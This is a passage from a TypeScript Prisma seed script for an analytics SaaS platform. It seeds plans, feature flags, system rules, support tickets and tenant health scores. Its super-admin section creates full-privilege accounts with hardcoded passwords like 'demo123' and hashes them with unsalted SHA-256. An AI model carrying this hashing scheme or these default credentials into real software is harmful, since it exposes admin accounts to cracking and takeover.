        brandTrackings: 2,
      },
    }
  })

  await prisma.plan.create({
    data: {
      name: 'team',
      displayName: 'Team',
      description: 'Collaboration features for small teams',
      tier: 'PROFESSIONAL',
      isActive: true,
      isPublic: true,
      sortOrder: 2,
      monthlyPrice: 19900, // $199
      yearlyPrice: 199900, // $1999
      limits: {
        agentRuns: 2500,
        teamSeats: 25,
        dataSources: 50,
        apiCallsPerMin: 750,
        retentionDays: 180,
        tokensPerMonth: 2500000,
        dashboards: 50,
        reports: 250,
        workflows: 25,
        brandTrackings: 10,
      },
    }
  })

  await prisma.plan.create({
    data: {
      name: 'business',
      displayName: 'Business',
      description: 'Advanced features for growing businesses',
      tier: 'PROFESSIONAL',
      isActive: true,
      isPublic: true,
      sortOrder: 3,
      monthlyPrice: 29900, // $299
      yearlyPrice: 299900, // $2999
      limits: {
        agentRuns: 5000,
        teamSeats: 50,
        dataSources: 100,
        apiCallsPerMin: 1000,
        retentionDays: 270,
        tokensPerMonth: 5000000,
        dashboards: 100,
        reports: 500,
        workflows: 50,
        brandTrackings: 20,
      },
    }
  })

  await prisma.plan.create({
    data: {
      name: 'enterprise-plus',
      displayName: 'Enterprise Plus',
      description: 'Premium enterprise features with dedicated support',
      tier: 'ENTERPRISE',
      isActive: true,
      isPublic: false,
      sortOrder: 5,
      monthlyPrice: 99900, // $999
      yearlyPrice: 999900, // $9999
      limits: {
        agentRuns: -1,
        teamSeats: -1,
        dataSources: -1,
        apiCallsPerMin: 5000,
        retentionDays: 730,
        tokensPerMonth: -1,
        dashboards: -1,
        reports: -1,
        workflows: -1,
        brandTrackings: -1,
      },
    }
  })

  await prisma.plan.create({
    data: {
      name: 'legacy-pro',
      displayName: 'Legacy Professional',
      description: 'Grandfathered professional plan',
      tier: 'PROFESSIONAL',
      isActive: false,
      isPublic: false,
      sortOrder: 99,
      monthlyPrice: 7900, // $79
      yearlyPrice: 79900, // $799
      limits: {
        agentRuns: 800,
        teamSeats: 8,
        dataSources: 20,
        apiCallsPerMin: 400,
        retentionDays: 90,
        tokensPerMonth: 800000,
        dashboards: 15,
        reports: 75,
        workflows: 8,
        brandTrackings: 4,
      },
    }
  })

  await prisma.plan.create({
    data: {
      name: 'partner',
      displayName: 'Partner Program',
      description: 'Special pricing for agency partners',
      tier: 'ENTERPRISE',
      isActive: true,
      isPublic: false,
      sortOrder: 6,
      monthlyPrice: 39900, // $399
      yearlyPrice: 399900, // $3999
      limits: {
        agentRuns: -1,
        teamSeats: 100,
        dataSources: -1,
        apiCallsPerMin: 3000,
        retentionDays: 365,
        tokensPerMonth: -1,
        dashboards: -1,
        reports: -1,
        workflows: -1,
        brandTrackings: 50,
      },
    }
  })

  // Assign features to Starter plan
  await prisma.planFeature.createMany({
    data: [
      { planId: starterPlan.id, featureId: featureDataExport.id, value: true },
    ]
  })

  // Assign features to Professional plan
  await prisma.planFeature.createMany({
    data: [
      { planId: professionalPlan.id, featureId: featureDataExport.id, value: true },
      { planId: professionalPlan.id, featureId: featureAdvancedAnalytics.id, value: true },
      { planId: professionalPlan.id, featureId: featureApiAccess.id, value: true },
      { planId: professionalPlan.id, featureId: featureCustomAgents.id, value: true },
      { planId: professionalPlan.id, featureId: featureCustomBranding.id, value: true },
    ]
  })

  // Assign features to Enterprise plan
  await prisma.planFeature.createMany({
    data: [
      { planId: enterprisePlan.id, featureId: featureDataExport.id, value: true },
      { planId: enterprisePlan.id, featureId: featureAdvancedAnalytics.id, value: true },
      { planId: enterprisePlan.id, featureId: featureApiAccess.id, value: true },
      { planId: enterprisePlan.id, featureId: featureCustomAgents.id, value: true },
      { planId: enterprisePlan.id, featureId: featureCustomBranding.id, value: true },
      { planId: enterprisePlan.id, featureId: featureSso.id, value: true },
      { planId: enterprisePlan.id, featureId: featureAuditLog.id, value: true },
      { planId: enterprisePlan.id, featureId: featurePrioritySupport.id, value: true },
      { planId: enterprisePlan.id, featureId: featureAdvancedWorkflows.id, value: true },
      { planId: enterprisePlan.id, featureId: featureMultiTenant.id, value: true },
    ]
  })

  console.log('   Created 3 plans with 10 features')

  // ==================== SUMMARY ====================
  console.log('\n✅ Database seeding completed!')
  // ==================== SUPER ADMINS ====================
  console.log('🔐 Creating super admin accounts...')

  // Helper to hash passwords for super admin (uses SHA256, not bcrypt)
  function hashSuperAdminPassword(password: string): string {
    return crypto.createHash('sha256').update(password).digest('hex')
  }

  // Super Admin accounts with different roles
  await prisma.superAdmin.create({
    data: {
      email: 'superadmin@gwi.com',
      name: 'Super Administrator',
      passwordHash: hashSuperAdminPassword('SuperAdmin123!'),
      role: 'SUPER_ADMIN',
      permissions: ['super:*'],
      isActive: true,
    }
  })

  await prisma.superAdmin.create({
    data: {
      email: 'admin@gwi.com',
      name: 'Platform Admin',
      passwordHash: hashSuperAdminPassword('Admin123!'),
      role: 'ADMIN',
      permissions: [
        'tenants:read', 'tenants:write', 'tenants:suspend',
        'users:read', 'users:write', 'users:ban',
        'analytics:read', 'analytics:export',
        'features:read', 'features:write',
        'rules:read', 'rules:write',
        'support:read', 'support:write', 'support:manage',
        'config:read',
        'audit:read',
        'notifications:read', 'notifications:write',
        'billing:read',
        'admins:read',
      ],
      isActive: true,
    }
  })

  await prisma.superAdmin.create({
    data: {
      email: 'support@gwi.com',
      name: 'Support Agent',
      passwordHash: hashSuperAdminPassword('Support123!'),
      role: 'SUPPORT',
      permissions: [
        'tenants:read',
        'users:read',
        'analytics:read',
        'features:read',
        'support:read', 'support:write',
        'audit:read',
        'notifications:read',
        'billing:read',
      ],
      isActive: true,
    }
  })

  await prisma.superAdmin.create({
    data: {
      email: 'analyst@gwi.com',
      name: 'Data Analyst',
      passwordHash: hashSuperAdminPassword('Analyst123!'),
      role: 'ANALYST',
      permissions: [
        'tenants:read',
        'users:read',
        'analytics:read', 'analytics:export',
        'features:read',
        'audit:read',
      ],
      isActive: true,
    }
  })

  // Demo super admin for easy testing
  await prisma.superAdmin.create({
    data: {
      email: 'demo-admin@gwi.com',
      name: 'Demo Admin',
      passwordHash: hashSuperAdminPassword('demo123'),
      role: 'SUPER_ADMIN',
      permissions: ['super:*'],
      isActive: true,
    }
  })

  // Additional super admins to reach 10
  await prisma.superAdmin.create({
    data: {
      email: 'security-admin@gwi.com',
      name: 'Security Admin',
      passwordHash: hashSuperAdminPassword('SecAdmin123!'),
      role: 'ADMIN',
      permissions: ['security:*', 'compliance:*', 'audit:read'],
      isActive: true,
    }
  })

  await prisma.superAdmin.create({
    data: {
      email: 'billing-admin@gwi.com',
      name: 'Billing Admin',
      passwordHash: hashSuperAdminPassword('BillAdmin123!'),
      role: 'ADMIN',
      permissions: ['billing:*', 'plans:*', 'tenants:read', 'users:read'],
      isActive: true,
    }
  })

  await prisma.superAdmin.create({
    data: {
      email: 'ops-admin@gwi.com',
      name: 'Operations Admin',
      passwordHash: hashSuperAdminPassword('OpsAdmin123!'),
      role: 'ADMIN',
      permissions: ['operations:*', 'incidents:*', 'maintenance:*', 'releases:*'],
      isActive: true,
    }
  })

  await prisma.superAdmin.create({
    data: {
      email: 'readonly-admin@gwi.com',
      name: 'Read Only Admin',
      passwordHash: hashSuperAdminPassword('ReadOnly123!'),
      role: 'ANALYST',
      permissions: ['*:read'],
      isActive: true,
    }
  })

  await prisma.superAdmin.create({
    data: {
      email: 'inactive-admin@gwi.com',
      name: 'Inactive Admin',
      passwordHash: hashSuperAdminPassword('Inactive123!'),
      role: 'ADMIN',
      permissions: ['tenants:*', 'users:*'],
      isActive: false,
    }
  })

  // ==================== FEATURE FLAGS ====================
  console.log('🚩 Creating feature flags...')

  await prisma.featureFlag.create({
    data: {
      key: 'ai_insights_v2',
      name: 'AI Insights V2',
      description: 'Next-generation AI-powered insights with deeper analysis capabilities',
      type: 'BOOLEAN',
      defaultValue: false,
      isEnabled: true,
      rolloutPercentage: 75,
      allowedPlans: ['PROFESSIONAL', 'ENTERPRISE'],
    }
  })

  await prisma.featureFlag.create({
    data: {
      key: 'brand_tracking_realtime',
      name: 'Real-time Brand Tracking',
      description: 'Enable real-time brand health monitoring and alerts',
      type: 'BOOLEAN',
      defaultValue: false,
      isEnabled: true,
      rolloutPercentage: 50,
      allowedPlans: ['ENTERPRISE'],
    }
  })

  await prisma.featureFlag.create({
    data: {
      key: 'advanced_crosstabs',
      name: 'Advanced Crosstab Analysis',
      description: 'Multi-dimensional crosstab analysis with statistical significance testing',
      type: 'BOOLEAN',
      defaultValue: false,
      isEnabled: true,
      rolloutPercentage: 100,
      allowedPlans: ['PROFESSIONAL', 'ENTERPRISE'],
    }
  })

  await prisma.featureFlag.create({
    data: {
      key: 'custom_agents',
      name: 'Custom Agent Builder',
      description: 'Allow users to create custom AI agents with specialized prompts',
      type: 'BOOLEAN',
      defaultValue: false,
      isEnabled: false,
      rolloutPercentage: 0,
    }
  })

  await prisma.featureFlag.create({
    data: {
      key: 'api_rate_limit',
      name: 'API Rate Limit',
      description: 'Requests per minute limit for API access',
      type: 'NUMBER',
      defaultValue: 100,
      isEnabled: true,
      rolloutPercentage: 100,
    }
  })

  await prisma.featureFlag.create({
    data: {
      key: 'export_formats',
      name: 'Export Formats',
      description: 'Available export formats for reports and data',
      type: 'JSON',
      defaultValue: ['pdf', 'csv', 'xlsx'],
      isEnabled: true,
      rolloutPercentage: 100,
    }
  })

  await prisma.featureFlag.create({
    data: {
      key: 'dark_mode',
      name: 'Dark Mode Theme',
      description: 'Enable dark mode UI theme for all users',
      type: 'BOOLEAN',
      defaultValue: true,
      isEnabled: true,
      rolloutPercentage: 100,
    }
  })

  await prisma.featureFlag.create({
    data: {
      key: 'multi_language_support',
      name: 'Multi-Language Support',
      description: 'Enable support for multiple languages in reports and UI',
      type: 'JSON',
      defaultValue: ['en', 'es', 'fr', 'de'],
      isEnabled: true,
      rolloutPercentage: 80,
      allowedPlans: ['PROFESSIONAL', 'ENTERPRISE'],
    }
  })

  await prisma.featureFlag.create({
    data: {
      key: 'advanced_permissions',
      name: 'Advanced Permission System',
      description: 'Granular role-based access control with custom permissions',
      type: 'BOOLEAN',
      defaultValue: false,
      isEnabled: true,
      rolloutPercentage: 60,
      allowedPlans: ['ENTERPRISE'],
    }
  })

  await prisma.featureFlag.create({
    data: {
      key: 'webhook_notifications',
      name: 'Webhook Notifications',
      description: 'Send real-time webhook notifications for events',
      type: 'BOOLEAN',
      defaultValue: false,
      isEnabled: true,
      rolloutPercentage: 90,
      allowedPlans: ['PROFESSIONAL', 'ENTERPRISE'],
    }
  })

  await prisma.featureFlag.create({
    data: {
      key: 'data_retention_days',
      name: 'Data Retention Period',
      description: 'Number of days to retain historical data',
      type: 'NUMBER',
      defaultValue: 365,
      isEnabled: true,
      rolloutPercentage: 100,
    }
  })

  await prisma.featureFlag.create({
    data: {
      key: 'ai_model_selection',
      name: 'AI Model Selection',
      description: 'Allow users to select different AI models for analysis',
      type: 'JSON',
      defaultValue: { default: 'gpt-4', available: ['gpt-4', 'gpt-3.5-turbo', 'claude-3'] },
      isEnabled: false,
      rolloutPercentage: 0,
      allowedPlans: ['ENTERPRISE'],
    }
  })

  await prisma.featureFlag.create({
    data: {
      key: 'scheduled_reports',
      name: 'Scheduled Reports',
      description: 'Enable automatic scheduled report generation and delivery',
      type: 'BOOLEAN',
      defaultValue: false,
      isEnabled: true,
      rolloutPercentage: 75,
      allowedPlans: ['PROFESSIONAL', 'ENTERPRISE'],
    }
  })

  await prisma.featureFlag.create({
    data: {
      key: 'bulk_data_import',
      name: 'Bulk Data Import',
      description: 'Allow importing large datasets in bulk via CSV/Excel',
      type: 'BOOLEAN',
      defaultValue: true,
      isEnabled: true,
      rolloutPercentage: 100,
    }
  })

  // ==================== SYSTEM RULES ====================
  console.log('📋 Creating system rules...')

  await prisma.systemRule.create({
    data: {
      name: 'API Rate Limiting',
      description: 'Enforce API rate limits based on plan tier',
      type: 'RATE_LIMIT',
      conditions: {
        metric: 'api_calls_per_minute',
        limits: { STARTER: 50, PROFESSIONAL: 200, ENTERPRISE: 1000 }
      },
      actions: {
        type: 'throttle',
        message: 'Rate limit exceeded. Please wait before making more requests.'
      },
      isActive: true,
      priority: 100,
      triggerCount: 1247,
      lastTriggered: new Date(now.getTime() - 5 * 60 * 1000),
    }
  })

  await prisma.systemRule.create({
    data: {
      name: 'Token Usage Alert',
      description: 'Alert when organization approaches token usage limit',
      type: 'USAGE',
      conditions: {
        metric: 'monthly_token_usage',
        threshold: 0.8,
        comparison: 'greater_than_percentage_of_limit'
      },
      actions: {
        type: 'notification',
        recipients: ['org_admins'],
        template: 'usage_warning'
      },
      isActive: true,
      priority: 80,
      triggerCount: 89,
      lastTriggered: new Date(now.getTime() - 2 * 60 * 60 * 1000),
    }
  })

  await prisma.systemRule.create({
    data: {
      name: 'Auto-Suspend Inactive Trials',
      description: 'Automatically suspend trial accounts after 14 days of inactivity',
      type: 'AUTO_SUSPEND',
      conditions: {
        accountType: 'trial',
        inactivityDays: 14,
        excludeWithPaymentMethod: true
      },
      actions: {
        type: 'suspend',
        suspensionType: 'PARTIAL',
        notifyUser: true,
        template: 'trial_inactive_suspension'
      },
      isActive: true,
      priority: 50,
      triggerCount: 23,
      lastTriggered: new Date(now.getTime() - 24 * 60 * 60 * 1000),
    }
  })

  await prisma.systemRule.create({
    data: {
      name: 'Content Policy Enforcement',
      description: 'Block inappropriate content in AI-generated outputs',
      type: 'CONTENT_POLICY',
      conditions: {
        scanTypes: ['ai_output', 'user_input', 'report_content'],
        categories: ['hate_speech', 'violence', 'adult_content', 'pii']
      },
      actions: {
        type: 'block_and_log',
        alertAdmins: true,
        userMessage: 'Content policy violation detected. This content cannot be processed.'
      },
      isActive: true,
      priority: 200,
      triggerCount: 7,
      lastTriggered: new Date(now.getTime() - 72 * 60 * 60 * 1000),
    }
  })

  await prisma.systemRule.create({
    data: {
      name: 'Failed Payment Auto-Action',
      description: 'Handle failed payment attempts and subscription issues',
      type: 'BILLING',
      conditions: {
        event: 'payment_failed',
        retryCount: 3,
        daysSinceFailure: 7
      },
      actions: {
        type: 'downgrade',
        targetPlan: 'STARTER',
        notifyUser: true,
        gracePeriodDays: 3
      },
      isActive: true,
      priority: 90,
      triggerCount: 12,
      lastTriggered: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000),
    }
  })

  await prisma.systemRule.create({
    data: {
      name: 'GDPR Data Deletion',
      description: 'Automatically process GDPR data deletion requests',
      type: 'COMPLIANCE',
      conditions: {
        requestType: 'gdpr_deletion',
        verificationRequired: true,
        cooldownPeriod: 30
      },
      actions: {
        type: 'schedule_deletion',
        notifyUser: true,
        notifyDPO: true,
        retentionExemptions: ['legal_hold', 'audit_logs']
      },
      isActive: true,
      priority: 150,
      triggerCount: 34,
      lastTriggered: new Date(now.getTime() - 12 * 60 * 60 * 1000),
    }
  })

  await prisma.systemRule.create({
    data: {
      name: 'Suspicious Login Detection',
      description: 'Detect and block suspicious login attempts',
      type: 'SECURITY',
      conditions: {
        triggers: ['new_device', 'unusual_location', 'multiple_failed_attempts'],
        failedAttemptThreshold: 5,
        locationChangeRadius: 500
      },
      actions: {
        type: 'require_verification',
        methods: ['email', 'sms'],
        lockoutDuration: 30,
        notifyUser: true
      },
      isActive: true,
      priority: 250,
      triggerCount: 156,
      lastTriggered: new Date(now.getTime() - 1 * 60 * 60 * 1000),
    }
  })

  await prisma.systemRule.create({
    data: {
      name: 'Storage Quota Enforcement',
      description: 'Enforce storage quotas based on plan tier',
      type: 'USAGE',
      conditions: {
        metric: 'storage_used_gb',
        limits: { STARTER: 10, PROFESSIONAL: 100, ENTERPRISE: 1000 },
        warningThreshold: 0.8
      },
      actions: {
        type: 'block_uploads',
        notifyUser: true,
        template: 'storage_limit_warning'
      },
      isActive: true,
      priority: 70,
      triggerCount: 45,
      lastTriggered: new Date(now.getTime() - 6 * 60 * 60 * 1000),
    }
  })

  await prisma.systemRule.create({
    data: {
      name: 'Scheduled Maintenance Notification',
      description: 'Send notifications before scheduled maintenance windows',
      type: 'NOTIFICATION',
      conditions: {
        eventType: 'scheduled_maintenance',
        advanceNoticeDays: [7, 1, 0],
        affectedServices: ['all']
      },
      actions: {
        type: 'send_notification',
        channels: ['email', 'in_app', 'webhook'],
        template: 'maintenance_notice'
      },
      isActive: true,
      priority: 40,
      triggerCount: 8,
      lastTriggered: new Date(now.getTime() - 14 * 24 * 60 * 60 * 1000),
    }
  })

  await prisma.systemRule.create({
    data: {
      name: 'API Abuse Detection',
      description: 'Detect and prevent API abuse patterns',
      type: 'SECURITY',
      conditions: {
        patterns: ['rapid_enumeration', 'credential_stuffing', 'scraping'],
        detectionWindow: 300,
        sensitivityLevel: 'high'
      },
      actions: {
        type: 'temporary_ban',
        duration: 3600,
        alertSecurityTeam: true,
        logDetails: true
      },
      isActive: true,
      priority: 300,
      triggerCount: 23,
      lastTriggered: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000),
    }
  })

  await prisma.systemRule.create({
    data: {
      name: 'Trial Expiration Handler',
      description: 'Handle trial account expirations and conversions',
      type: 'BILLING',
      conditions: {
        accountType: 'trial',
        daysBeforeExpiration: [7, 3, 1, 0],
        hasPaymentMethod: false
      },
      actions: {
        type: 'send_reminder',
        template: 'trial_expiring',
        offerDiscount: true,
        discountPercent: 20
      },
      isActive: true,
      priority: 60,
      triggerCount: 89,
      lastTriggered: new Date(now.getTime() - 8 * 60 * 60 * 1000),
    }
  })

  await prisma.systemRule.create({
    data: {
      name: 'Data Export Compliance',
      description: 'Ensure data exports comply with regional regulations',
      type: 'COMPLIANCE',
      conditions: {
        exportTypes: ['bulk_export', 'report_download', 'api_export'],
        regions: ['EU', 'CA', 'BR'],
        dataTypes: ['pii', 'financial', 'health']
      },
      actions: {
        type: 'add_audit_trail',
        requireApproval: true,
        encryptExport: true,
        notifyDPO: true
      },
      isActive: true,
      priority: 180,
      triggerCount: 67,
      lastTriggered: new Date(now.getTime() - 4 * 60 * 60 * 1000),
    }
  })

  // ==================== SUPPORT TICKETS ====================
  console.log('🎫 Creating support tickets...')

  const ticket1 = await prisma.supportTicket.create({
    data: {
      ticketNumber: 'TKT-202501-00001',
      orgId: acmeCorp.id,
      userId: johnDoe.id,
      subject: 'Cannot export large crosstab to PDF',
      description: 'When I try to export a crosstab with more than 50 rows to PDF, the export fails with a timeout error. This is blocking our quarterly report delivery.',
      category: 'TECHNICAL',
      priority: 'HIGH',
      status: 'IN_PROGRESS',
      tags: ['export', 'pdf', 'crosstab', 'performance'],
      firstResponseAt: new Date(now.getTime() - 2 * 60 * 60 * 1000),
    }
  })

  await prisma.ticketResponse.create({
    data: {
      ticketId: ticket1.id,
      responderId: 'support-agent-1',
      responderType: 'admin',
      message: 'Thank you for reporting this issue. I\'ve escalated this to our engineering team. As a workaround, you can try exporting in CSV format and converting to PDF using a third-party tool. We\'ll update you once we have a fix.',
      isInternal: false,
    }
  })

  await prisma.ticketResponse.create({
    data: {
      ticketId: ticket1.id,
      responderId: 'support-agent-1',
      responderType: 'admin',
      message: 'Engineering confirmed this is a memory issue with large exports. Fix scheduled for next release (v2.4.1).',
      isInternal: true,
    }
  })

  const ticket2 = await prisma.supportTicket.create({
    data: {
      ticketNumber: 'TKT-202501-00002',
      orgId: techStartup.id,
      userId: bobWilson.id,
      subject: 'Request for API rate limit increase',
      description: 'Our team has grown significantly and we\'re hitting our API rate limits during peak hours. We\'d like to request a rate limit increase from 200 to 500 requests per minute.',
      category: 'FEATURE_REQUEST',
      priority: 'MEDIUM',
      status: 'WAITING_ON_INTERNAL',
      tags: ['api', 'rate-limit', 'upgrade'],
      firstResponseAt: new Date(now.getTime() - 24 * 60 * 60 * 1000),
    }
  })

  await prisma.ticketResponse.create({
    data: {
      ticketId: ticket2.id,
      responderId: 'support-agent-2',
      responderType: 'admin',
      message: 'I understand your need for higher rate limits. I\'ve forwarded this to our sales team to discuss upgrade options that would better suit your growing needs.',
      isInternal: false,
    }
  })

  await prisma.supportTicket.create({
    data: {
      ticketNumber: 'TKT-202501-00003',
      orgId: acmeCorp.id,
      userId: janeSmith.id,
      subject: 'Billing discrepancy on last invoice',
      description: 'Our last invoice shows charges for 15 team seats but we only have 12 active users. Please review and adjust.',
      category: 'BILLING',
      priority: 'MEDIUM',
      status: 'OPEN',
      tags: ['billing', 'invoice', 'seats'],
    }
  })

  await prisma.supportTicket.create({
    data: {
      ticketNumber: 'TKT-202501-00004',
      orgId: enterpriseCo.id,
      userId: sarahEnterprise.id,
      subject: 'SSO integration not working after domain change',
      description: 'We recently changed our company domain from old-company.com to enterprise-co.com. Now SSO authentication is failing for all users.',
      category: 'TECHNICAL',
      priority: 'URGENT',
      status: 'IN_PROGRESS',
      tags: ['sso', 'authentication', 'domain'],
      firstResponseAt: new Date(now.getTime() - 30 * 60 * 1000),
    }
  })

  await prisma.supportTicket.create({
    data: {
      ticketNumber: 'TKT-202501-00005',
      orgId: techStartup.id,
      subject: 'Feature suggestion: Slack integration',
      description: 'It would be great to have native Slack integration for receiving alerts and sharing insights directly to our team channels.',
      category: 'FEATURE_REQUEST',
      priority: 'LOW',
      status: 'OPEN',
      tags: ['integration', 'slack', 'notifications'],
    }
  })

  await prisma.supportTicket.create({
    data: {
      ticketNumber: 'TKT-202501-00006',
      orgId: acmeCorp.id,
      userId: adminUser.id,
      subject: 'Security audit request',
      description: 'Our compliance team needs the latest SOC 2 report and security documentation for our annual vendor review.',
      category: 'SECURITY',
      priority: 'MEDIUM',
      status: 'RESOLVED',
      tags: ['security', 'compliance', 'soc2'],
      resolvedAt: new Date(now.getTime() - 48 * 60 * 60 * 1000),
      firstResponseAt: new Date(now.getTime() - 72 * 60 * 60 * 1000),
    }
  })

  await prisma.supportTicket.create({
    data: {
      ticketNumber: 'TKT-202501-00007',
      orgId: enterpriseCo.id,
      userId: sarahEnterprise.id,
      subject: 'Need custom report template',
      description: 'We need a custom branded report template that matches our corporate design guidelines. Can you help us set this up?',
      category: 'FEATURE_REQUEST',
      priority: 'LOW',
      status: 'WAITING_ON_CUSTOMER',
      tags: ['branding', 'reports', 'customization'],
      firstResponseAt: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000),
    }
  })

  await prisma.supportTicket.create({
    data: {
      ticketNumber: 'TKT-202501-00008',
      orgId: techStartup.id,
      userId: bobWilson.id,
      subject: 'Data import failed with timeout',
      description: 'Trying to import a 50MB CSV file but keep getting timeout errors after about 2 minutes. The file has approximately 500,000 rows of survey data.',
      category: 'BUG_REPORT',
      priority: 'HIGH',
      status: 'IN_PROGRESS',
      tags: ['import', 'csv', 'performance', 'timeout'],
      firstResponseAt: new Date(now.getTime() - 4 * 60 * 60 * 1000),
    }
  })

  await prisma.supportTicket.create({
    data: {
      ticketNumber: 'TKT-202501-00009',
      orgId: acmeCorp.id,
      userId: janeSmith.id,
      subject: 'AI agent producing inconsistent results',
      description: 'The sentiment analysis agent is giving different results for the same text input when run multiple times. Expected deterministic output.',
      category: 'BUG_REPORT',
      priority: 'MEDIUM',
      status: 'OPEN',
      tags: ['ai', 'agent', 'sentiment', 'consistency'],
    }
  })

  await prisma.supportTicket.create({
    data: {
      ticketNumber: 'TKT-202501-00010',
      orgId: enterpriseCo.id,
      subject: 'Request for dedicated account manager',
      description: 'As we scale our usage, we would like to have a dedicated account manager assigned to our organization for better support coordination.',
      category: 'ACCOUNT',
      priority: 'MEDIUM',
      status: 'RESOLVED',
      tags: ['account', 'support', 'enterprise'],
      resolvedAt: new Date(now.getTime() - 24 * 60 * 60 * 1000),
      firstResponseAt: new Date(now.getTime() - 48 * 60 * 60 * 1000),
    }
  })

  await prisma.supportTicket.create({
    data: {
      ticketNumber: 'TKT-202501-00011',
      orgId: suspendedOrg.id,
      subject: 'Appeal account suspension',
      description: 'Our account was suspended due to alleged ToS violation. We believe this was a mistake and would like to appeal this decision.',
      category: 'ACCOUNT',
      priority: 'URGENT',
      status: 'WAITING_ON_INTERNAL',
      tags: ['suspension', 'appeal', 'tos'],
      firstResponseAt: new Date(now.getTime() - 2 * 60 * 60 * 1000),
    }
  })

  await prisma.supportTicket.create({
    data: {
      ticketNumber: 'TKT-202501-00012',
      orgId: billingIssueOrg.id,
      subject: 'Payment method update not working',
      description: 'I am trying to update our credit card information but the form keeps showing an error. We need to resolve this before our subscription lapses.',
      category: 'BILLING',
      priority: 'HIGH',
      status: 'IN_PROGRESS',
      tags: ['payment', 'credit-card', 'billing'],
      firstResponseAt: new Date(now.getTime() - 1 * 60 * 60 * 1000),
    }
  })

  await prisma.supportTicket.create({
    data: {
      ticketNumber: 'TKT-202501-00013',
      orgId: trialOrg.id,
      subject: 'Questions about enterprise features',
      description: 'We are evaluating your platform for our organization. Can you provide more details about SSO integration and audit logging capabilities?',
      category: 'OTHER',
      priority: 'LOW',
      status: 'RESOLVED',
      tags: ['trial', 'evaluation', 'enterprise', 'sso'],
      resolvedAt: new Date(now.getTime() - 12 * 60 * 60 * 1000),
      firstResponseAt: new Date(now.getTime() - 18 * 60 * 60 * 1000),
    }
  })

  await prisma.supportTicket.create({
    data: {
      ticketNumber: 'TKT-202501-00014',
      orgId: acmeCorp.id,
      userId: johnDoe.id,
      subject: 'Dashboard widget not loading',
      description: 'The brand health widget on our main dashboard shows a spinning loader indefinitely. Other widgets work fine. Started happening after the latest update.',
      category: 'BUG_REPORT',
      priority: 'MEDIUM',
      status: 'CLOSED',
      tags: ['dashboard', 'widget', 'ui', 'bug'],
      resolvedAt: new Date(now.getTime() - 6 * 60 * 60 * 1000),
      firstResponseAt: new Date(now.getTime() - 10 * 60 * 60 * 1000),
    }
  })

  // ==================== TENANT HEALTH SCORES ====================
  console.log('💚 Creating tenant health scores...')

  await prisma.tenantHealthScore.create({
    data: {
      orgId: acmeCorp.id,
      overallScore: 87,
      engagementScore: 92,
      usageScore: 82,
      healthIndicators: {
        dailyActiveUsers: 45,
        weeklyAgentRuns: 234,
        featureAdoption: 0.78,
        supportTickets: 2,
        nps: 72
      },
      riskLevel: 'HEALTHY',
      churnProbability: 0.05,
      recommendations: ['Consider upgrading to Enterprise for advanced features', 'Enable brand tracking for competitive insights'],
    }
  })

  await prisma.tenantHealthScore.create({
    data: {
      orgId: techStartup.id,
      overallScore: 64,
      engagementScore: 58,
      usageScore: 70,
      healthIndicators: {
        dailyActiveUsers: 8,
        weeklyAgentRuns: 45,
        featureAdoption: 0.45,
        supportTickets: 3,
        nps: 45
      },
      riskLevel: 'AT_RISK',
      churnProbability: 0.35,
      recommendations: ['Schedule customer success call', 'Offer training session on advanced features', 'Consider temporary rate limit increase'],
    }
  })

  await prisma.tenantHealthScore.create({
    data: {
      orgId: enterpriseCo.id,
      overallScore: 95,
      engagementScore: 98,
      usageScore: 92,
      healthIndicators: {
        dailyActiveUsers: 127,
        weeklyAgentRuns: 1456,
        featureAdoption: 0.94,
        supportTickets: 1,
        nps: 89
      },
      riskLevel: 'HEALTHY',
      churnProbability: 0.02,
      recommendations: ['Potential case study candidate', 'Consider for beta program'],
    }
  })

  // Historical health scores (30 days ago)
  await prisma.tenantHealthScore.create({
    data: {
      orgId: acmeCorp.id,
      overallScore: 82,
      engagementScore: 85,
      usageScore: 79,
      healthIndicators: {
        dailyActiveUsers: 38,
        weeklyAgentRuns: 198,
        featureAdoption: 0.72,
        supportTickets: 4,
        nps: 68
      },
      riskLevel: 'HEALTHY',
      churnProbability: 0.08,
      recommendations: ['Improve feature adoption', 'Address support ticket backlog'],
      calculatedAt: new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000),
    }
  })

  await prisma.tenantHealthScore.create({
    data: {
      orgId: techStartup.id,
      overallScore: 71,
      engagementScore: 68,
      usageScore: 74,
      healthIndicators: {
        dailyActiveUsers: 11,
        weeklyAgentRuns: 62,
        featureAdoption: 0.51,
        supportTickets: 1,
        nps: 52
      },
      riskLevel: 'AT_RISK',
      churnProbability: 0.28,
      recommendations: ['Monitor closely for engagement drop', 'Consider proactive outreach'],
      calculatedAt: new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000),
    }
  })

  await prisma.tenantHealthScore.create({
    data: {
      orgId: enterpriseCo.id,
      overallScore: 93,
      engagementScore: 96,
      usageScore: 90,
      healthIndicators: {
        dailyActiveUsers: 119,
        weeklyAgentRuns: 1320,
        featureAdoption: 0.91,
        supportTickets: 2,
        nps: 86
      },
      riskLevel: 'HEALTHY',
      churnProbability: 0.03,
      recommendations: ['Strong account - consider upsell opportunities'],
      calculatedAt: new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000),
    }
  })

  // Historical health scores (60 days ago)
  await prisma.tenantHealthScore.create({
    data: {
      orgId: acmeCorp.id,
      overallScore: 78,
      engagementScore: 80,
      usageScore: 76,
      healthIndicators: {
        dailyActiveUsers: 32,
        weeklyAgentRuns: 156,
        featureAdoption: 0.65,
        supportTickets: 3,
        nps: 62
      },
      riskLevel: 'HEALTHY',
      churnProbability: 0.12,
      recommendations: ['Onboarding follow-up needed', 'Schedule training session'],
      calculatedAt: new Date(now.getTime() - 60 * 24 * 60 * 60 * 1000),
    }
  })

  await prisma.tenantHealthScore.create({
    data: {
      orgId: techStartup.id,
      overallScore: 55,
      engagementScore: 48,
      usageScore: 62,
      healthIndicators: {
        dailyActiveUsers: 5,
        weeklyAgentRuns: 28,
        featureAdoption: 0.35,
        supportTickets: 5,
        nps: 38
      },
      riskLevel: 'CRITICAL',
      churnProbability: 0.52,
      recommendations: ['Urgent intervention needed', 'Escalate to customer success manager', 'Offer extended trial'],
      calculatedAt: new Date(now.getTime() - 60 * 24 * 60 * 60 * 1000),
    }
  })

  await prisma.tenantHealthScore.create({
    data: {
      orgId: enterpriseCo.id,
      overallScore: 91,
      engagementScore: 94,
      usageScore: 88,
      healthIndicators: {
        dailyActiveUsers: 108,
        weeklyAgentRuns: 1180,
